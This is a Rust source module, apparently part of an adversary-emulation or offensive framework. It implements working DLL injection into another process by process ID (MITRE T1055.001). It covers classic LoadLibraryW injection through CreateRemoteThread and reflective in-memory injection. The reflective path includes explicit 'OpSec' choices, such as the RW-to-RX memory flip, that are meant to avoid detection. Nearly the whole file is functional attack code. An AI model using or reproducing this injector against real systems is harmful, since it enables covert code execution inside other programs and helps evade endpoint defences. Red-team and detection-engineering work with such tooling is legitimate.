//! Implementation of **MITRE ATT&CK T1055.001: Dynamic-link Library Injection**.
//!
//! This module implements two distinct DLL injection strategies:
//! 1. **Classic Injection (`Classic`)**: Leverages the Windows OS loader by forcing a remote process
//!    to execute `LoadLibraryW` on a DLL path present on the disk. This is reliable but "noisy"
//!    (disk artifacts).
//! 2. **Reflective Injection (`Reflective`)**: Maps a DLL manually from memory into a remote process.
//!    This requires the target DLL to export a special `ReflectiveLoader` function which handles
//!    its own initialization (imports, relocations) without the OS loader's help.

use std::{
    mem::transmute,
    os::windows::{ffi::OsStrExt, raw::HANDLE},
    path::Path,
    ptr::{null, null_mut},
    slice::from_raw_parts,
};

#[cfg(target_arch = "x86")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
#[cfg(target_arch = "x86_64")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

use windows_sys::{
    Win32::{
        Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
        System::{
            Diagnostics::Debug::{IMAGE_FILE_HEADER, IMAGE_SECTION_HEADER, WriteProcessMemory},
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
                VirtualProtectEx,
            },
            SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
            Threading::{
                CreateRemoteThread, LPTHREAD_START_ROUTINE, OpenProcess, PROCESS_CREATE_THREAD,
                PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
            },
        },
    },
    core::PCSTR,
    w,
};

use crate::{
    Error, Result, info,
    payload::Payload,
    strategy::{DynamicLinkLibrary, Strategy, Technique},
    target::Target,
};

/// The concrete strategy implementation for T1055.001.
#[derive(Default)]
pub struct T1055_001;

impl Strategy for T1055_001 {
    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
        let info = technique.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        // 1. Unwrap the configuration specific to this technique.
        let method = match technique {
            Technique::T1055_001(m) => m,
            _ => return Err(Error::Execution("Internal dispatch error".into())),
        };

        // 2. Validate Target: Must be a PID (Remote Injection).
        let process_id = match target {
            Target::Pid(id) => *id,
            _ => {
                return Err(Error::Validation(format!(
                    "Strategy '{}' requires a Target PID.",
                    info.mitre_id
                )));
            }
        };

        // 3. Dispatch based on the specific variant.
        match method {
            DynamicLinkLibrary::Classic => {
                info!("Method: Classic DLL Injection");
                // Validate Payload: Must be a DLL file path (on disk).
                let dll_path = match payload {
                    Payload::DllFile {
                        file_path: Some(p), ..
                    } => p,
                    Payload::DllFile {
                        file_path: None, ..
                    } => {
                        return Err(Error::Validation(
                            "Classic DLL Injection requires the DLL to be on disk (path).".into(),
                        ));
                    }
                    _ => {
                        return Err(Error::Mismatch {
                            strategy: info.mitre_id,
                            variant: payload.variant_name(),
                        });
                    }
                };
                inject_dll_classic(process_id, dll_path)
            }
            DynamicLinkLibrary::Reflective => {
                info!("Method: Reflective DLL Injection");
                // Validate Payload: Must be DLL raw bytes (image).
                // Note: The payload *must* be a special "Reflective DLL". Standard DLLs will crash.
                let dll_bytes = match payload {
                    Payload::DllFile {
                        image_bytes: Some(b),
                        ..
                    } => b,
                    Payload::DllFile {
                        image_bytes: None, ..
                    } => {
                        return Err(Error::Validation(
                            "Reflective DLL Injection requires raw image bytes.".into(),
                        ));
                    }
                    _ => {
                        return Err(Error::Mismatch {
                            strategy: info.mitre_id,
                            variant: payload.variant_name(),
                        });
                    }
                };
                inject_dll_reflective(process_id, dll_bytes)
            }
        }
    }
}

/// A RAII (Resource Acquisition Is Initialization) wrapper for Windows Handles.
///
/// Ensures that `CloseHandle` is automatically called when the scope ends,
/// preventing resource leaks in the operating system.
struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// Performs the "Classic" DLL injection sequence.
///
/// # Logic Flow
/// 1. **OpenProcess**: Acquire a handle to the target PID with specific permissions.
/// 2. **VirtualAllocEx**: Allocate memory in the remote process for the DLL path.
/// 3. **WriteProcessMemory**: Copy the DLL path string into the allocated remote memory.
/// 4. **GetProcAddress**: Resolve the address of `LoadLibraryW` in `kernel32.dll`.
///    *Note: kernel32 is mapped at the same address in almost all processes.*
/// 5. **CreateRemoteThread**: Spawn a thread in the target that executes `LoadLibraryW(path)`.
fn inject_dll_classic(process_id: u32, dll_path: &Path) -> Result<()> {
    // 1. Prepare Path (Windows requires UTF-16 null-terminated strings)
    let path_utf16 = to_utf16_null_terminated(dll_path);
    let alloc_size = path_utf16.len() * size_of::<u16>();

    // 2. Open Target Process
    // Request minimal privileges required for the operation (OpSec best practice).
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            FALSE,
            process_id,
        )
    };

    if process_handle.is_null() {
        return Err(Error::Win32("OpenProcess", unsafe { GetLastError() }));
    }

    // Wrap in guard immediately to ensure cleanup on error.
    let process_guard = HandleGuard::new(process_handle);

    // 3. Allocate Memory in Target
    let remote_addr = unsafe {
        VirtualAllocEx(
            process_guard.0,
            null(),
            alloc_size,
            MEM_COMMIT,
            PAGE_READWRITE,
        )
    };

    if remote_addr.is_null() {
        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
    }

    // 4. Write DLL Path to Target Memory
    let mut write_len: usize = 0;

    let success = unsafe {
        WriteProcessMemory(
            process_guard.0,
            remote_addr,
            path_utf16.as_ptr().cast(),
            alloc_size,
            &mut write_len,
        )
    };

    if success == 0 || write_len != alloc_size {
        return Err(Error::Win32("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 5. Resolve LoadLibraryW Address
    // We look it up in our own process. Because kernel32.dll is a "Known DLL",
    // ASLR usually maps it to the same address in all processes during the same boot session.
    let kernel32_ptr = w!("kernel32.dll");
    let module_handle = unsafe { GetModuleHandleW(kernel32_ptr) };

    if module_handle.is_null() {
        return Err(Error::Win32("GetModuleHandleW", unsafe { GetLastError() }));
    }

    let func_name = c"LoadLibraryW";

    let load_library_addr = unsafe { GetProcAddress(module_handle, func_name.as_ptr() as PCSTR) };

    if load_library_addr.is_none() {
        return Err(Error::Win32("GetProcAddress", unsafe { GetLastError() }));
    }

    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(load_library_addr) };

    // 6. Create Remote Thread
    // This executes LoadLibraryW(remote_addr) inside the target process.
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_guard.0,
            null(),
            0,
            routine_ptr,
            remote_addr,
            0,
            null_mut(),
        )
    };

    if thread_handle.is_null() {
        return Err(Error::Win32("CreateRemoteThread", unsafe {
            GetLastError()
        }));
    }

    let _thread_guard = HandleGuard::new(thread_handle);

    Ok(())
}

/// Performs **Reflective DLL Injection**.
///
/// This technique injects a DLL entirely from memory. It relies on the DLL exporting
/// a function named `ReflectiveLoader` which acts as a minimal custom loader (resolving
/// its own imports and relocations) because the Windows OS loader is bypassed.
///
/// Allocates memory, writes the raw DLL, finds the `ReflectiveLoader` export, and executes it.
///
/// # OpSec Considerations
/// This implementation avoids `PAGE_EXECUTE_READWRITE` (RWX). It uses a
/// Write (RW) -> Protect (RX) -> Execute pattern to minimize detection vectors.
fn inject_dll_reflective(process_id: u32, image_bytes: &[u8]) -> Result<()> {
    // 1. Parse the DLL locally to find the offset of the "ReflectiveLoader" function.
    let loader_offset = find_reflective_loader_offset(image_bytes).ok_or_else(|| {
        Error::InvalidImage(
            "Could not find exported function 'ReflectiveLoader'. \
             Ensure the DLL was compiled for Reflective Injection."
                .into(),
        )
    })?;

    info!("ReflectiveLoader found at offset: {:#x}", loader_offset);

    // 2. Open Target Process
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            FALSE,
            process_id,
        )
    };

    if process_handle.is_null() {
        return Err(Error::Win32("OpenProcess", unsafe { GetLastError() }));
    }

    let process_guard = HandleGuard::new(process_handle);

    // 3. Allocate Memory (RW only)
    // OpSec: We allocate READWRITE first. We will flip to EXECUTE_READ later.
    // This avoids the highly suspicious RWX permission.
    let remote_addr = unsafe {
        VirtualAllocEx(
            process_guard.0,
            null(),
            image_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_addr.is_null() {
        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
    }

    // 4. Write the Raw DLL bytes to the target
    let mut write_len: usize = 0;

    let success = unsafe {
        WriteProcessMemory(
            process_guard.0,
            remote_addr,
            image_bytes.as_ptr().cast(),
            image_bytes.len(),
            &mut write_len,
        )
    };

    if success == 0 || write_len != image_bytes.len() {
        return Err(Error::Win32("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 5. Change Protection to RX (Execute-Read)
    // OpSec: Now that data is written, we mark the memory as Executable so the loader can run.
    let mut old_protection: u32 = 0;

    let success = unsafe {
        VirtualProtectEx(
            process_guard.0,
            remote_addr,
            image_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_protection,
        )
    };

    if success == 0 {
        return Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }));
    }

    // 6. Calculate remote address of the loader
    // The thread start address = Base Address (Remote) + Offset of Loader function
    let remote_loader_addr = (remote_addr as usize + loader_offset) as *const ();
    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_loader_addr) };

    info!(
        "Spawning thread at remote address: {:p} (Base: {:p} + Offset: {:#x})",
        remote_loader_addr, remote_addr, loader_offset
    );

    // 7. Execute the loader
    // We pass `remote_addr` (the base of our allocation) as the parameter to the thread.
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_guard.0,
            null(),
            0,
            routine_ptr,
            remote_addr,
            0,
            null_mut(),
        )
    };

    if thread_handle.is_null() {
        return Err(Error::Win32("CreateRemoteThread", unsafe {
            GetLastError()
        }));
    }

    let _thread_guard = HandleGuard::new(thread_handle);

    Ok(())
}

/// Helper: Parses the PE header to find the RVA (Relative Virtual Address) of "ReflectiveLoader".
///
/// This manually traverses the Export Directory Table of the PE file in memory.
fn find_reflective_loader_offset(image_bytes: &[u8]) -> Option<usize> {
    if image_bytes.len() < size_of::<IMAGE_DOS_HEADER>() {
        return None;
    }

    // 1. DOS Header
    let dos_header = unsafe { &*(image_bytes.as_ptr() as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != 0x5A4D {
        return None;
    }

    let nt_headers_offset = dos_header.e_lfanew as usize;
    if image_bytes.len() < nt_headers_offset + size_of::<IMAGE_NT_HEADERS>() {
        return None;
    }

    // 2. NT Headers & Export Directory
    let export_dir_rva;
    let section_count;
    let section_header_offset;

    unsafe {
        let nt_header = &*(image_bytes.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS);
        if nt_header.Signature != 0x00004550 {
            return None;
        }

        let export_entry = nt_header.OptionalHeader.DataDirectory[0];
        export_dir_rva = export_entry.VirtualAddress as usize;
        if export_dir_rva == 0 {
            return None;
        }

        section_count = nt_header.FileHeader.NumberOfSections;
        section_header_offset = nt_headers_offset
            + size_of::<u32>()
            + size_of::<IMAGE_FILE_HEADER>()
            + nt_header.FileHeader.SizeOfOptionalHeader as usize;
    }

    // 3. Map RVA to File Offset (The Export Directory is at an RVA, we need the raw file offset)
    let export_file_offset = rva_to_file_offset(
        export_dir_rva,
        section_count,
        section_header_offset,
        image_bytes,
    )?;

    let export_dir = unsafe {
        &*(image_bytes.as_ptr().add(export_file_offset) as *const IMAGE_EXPORT_DIRECTORY)
    };

    let names_rva = export_dir.AddressOfNames as usize;
    let functions_rva = export_dir.AddressOfFunctions as usize;
    let ordinals_rva = export_dir.AddressOfNameOrdinals as usize;
    let num_names = export_dir.NumberOfNames;

    let names_offset =
        rva_to_file_offset(names_rva, section_count, section_header_offset, image_bytes)?;
    let ordinals_offset = rva_to_file_offset(
        ordinals_rva,
        section_count,
        section_header_offset,
        image_bytes,
    )?;
    let functions_offset = rva_to_file_offset(
        functions_rva,
        section_count,
        section_header_offset,
        image_bytes,
    )?;

    let names_slice = unsafe {
        from_raw_parts(
            image_bytes.as_ptr().add(names_offset) as *const u32,
            num_names as usize,
        )
    };
    let ordinals_slice = unsafe {
        from_raw_parts(
            image_bytes.as_ptr().add(ordinals_offset) as *const u16,
            num_names as usize,
        )
    };
    let functions_slice = unsafe {
        from_raw_parts(
            image_bytes.as_ptr().add(functions_offset) as *const u32,
            export_dir.NumberOfFunctions as usize,
        )
    };

    for (i, &name_rva) in names_slice.iter().enumerate() {
        let name_offset = rva_to_file_offset(
            name_rva as usize,
            section_count,
            section_header_offset,
            image_bytes,
        )?;
        let name_ptr = unsafe { image_bytes.as_ptr().add(name_offset) } as *const i8;
        let name_len = (0..)
            .find(|&x| unsafe { *name_ptr.add(x) } == 0)
            .unwrap_or(0);
        let name_bytes = unsafe { from_raw_parts(name_ptr as *const u8, name_len) };

        if name_bytes == b"ReflectiveLoader" {
            let ordinal = ordinals_slice[i] as usize;
            let function_rva = functions_slice[ordinal];
            // Since we write the raw file as-is, we need to convert the RVA (where it would be in memory)
            // back to the file offset (where it is in our raw buffer) to get the offset from the base.
            return rva_to_file_offset(
                function_rva as usize,
                section_count,
                section_header_offset,
                image_bytes,
            );
        }
    }

    None
}

/// Helper: Converts RVA (Relative Virtual Address) to File Offset.
///
/// This iterates through the section headers to determine which section contains the RVA,
/// then calculates the physical offset in the file.
fn rva_to_file_offset(
    rva: usize,
    section_count: u16,
    section_header_offset: usize,
    image_bytes: &[u8],
) -> Option<usize> {
    let mut current_header_offset = section_header_offset;

    for _ in 0..section_count {
        let section = unsafe {
            &*(image_bytes.as_ptr().add(current_header_offset) as *const IMAGE_SECTION_HEADER)
        };

        let virtual_addr_start = section.VirtualAddress as usize;
        let virtual_addr_end = virtual_addr_start + unsafe { section.Misc.VirtualSize } as usize;

        if rva >= virtual_addr_start && rva < virtual_addr_end {
            let delta = rva - virtual_addr_start;
            return Some(section.PointerToRawData as usize + delta);
        }

        current_header_offset += size_of::<IMAGE_SECTION_HEADER>();
    }
    None
}

/// Helper: Converts a Rust Path to a null-terminated UTF-16 vector.
fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
    path.as_os_str().encode_wide().chain([0]).collect()
}
